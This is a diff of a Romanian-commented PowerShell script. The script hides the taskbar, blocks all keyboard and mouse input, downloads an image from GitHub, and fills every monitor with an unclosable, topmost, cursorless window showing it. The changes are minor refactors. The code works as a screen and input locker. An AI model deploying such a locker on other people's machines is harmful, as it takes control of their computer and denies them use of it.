@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod pentru blocare/deblocare input și taskbar
+# Cod C# pentru blocare/deblocare input și taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,46 +15,44 @@ public class NativeMethods {
 }
 "@
 
-# Ascunde taskbar
+# Ascunde Taskbar
 $taskbar = [NativeMethods]::FindWindow("Shell_TrayWnd", "")
 [NativeMethods]::ShowWindow($taskbar, 0)
 
-# Blochează input complet
+# Blochează input
 [NativeMethods]::BlockInput($true)
 
-# Descarcă poza
+# Descarcă poza (salvată temporar)
 $tempImage = "$env:TEMP\poza_laptop.jpg"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage -UseBasicParsing
 
-# Lista de ferestre pentru fiecare ecran
+# Variabilă de control
+$script:inchis = $false
 $forms = @()
-$global:inchis = $false
 
-# Funcție pentru închiderea tuturor
+# Funcție de închidere
 function InchideTot {
-    $global:inchis = $true
     [NativeMethods]::BlockInput($false)
     [NativeMethods]::ShowWindow($taskbar, 1)
+    $script:inchis = $true
     foreach ($f in $forms) {
-        $f.Invoke([Action]{ $f.Close() })
+        try { $f.Invoke([Action]{ $f.Close() }) } catch {}
     }
 }
 
-# Creează ferestre pe toate monitoarele
+# CREEAZĂ CÂTE O FEREASTRĂ PE FIECARE MONITOR
 foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form
-    $form.StartPosition = 'Manual'
-    $form.Bounds = $screen.Bounds
     $form.FormBorderStyle = 'None'
     $form.TopMost = $true
+    $form.Bounds = $screen.Bounds
     $form.BackColor = 'Black'
     $form.KeyPreview = $true
     $form.ShowInTaskbar = $false
     $form.Cursor = [System.Windows.Forms.Cursors]::None
 
-    $img = [System.Drawing.Image]::FromFile($tempImage)
     $pb = New-Object Windows.Forms.PictureBox
-    $pb.Image = $img
+    $pb.ImageLocation = $tempImage
     $pb.SizeMode = 'Zoom'
     $pb.Dock = 'Fill'
     $form.Controls.Add($pb)
@@ -66,7 +64,7 @@ foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     })
 
     $form.Add_FormClosing({
-        if (-not $global:inchis) {
+        if (-not $script:inchis) {
             $_.Cancel = $true
         }
     })
@@ -75,5 +73,7 @@ foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $forms += $form
 }
 
-# Pornește aplicația
-[System.Windows.Forms.Application]::Run()
+# Blochează scriptul până se închide manual
+while (-not $script:inchis) {
+    Start-Sleep -Milliseconds 300
+}
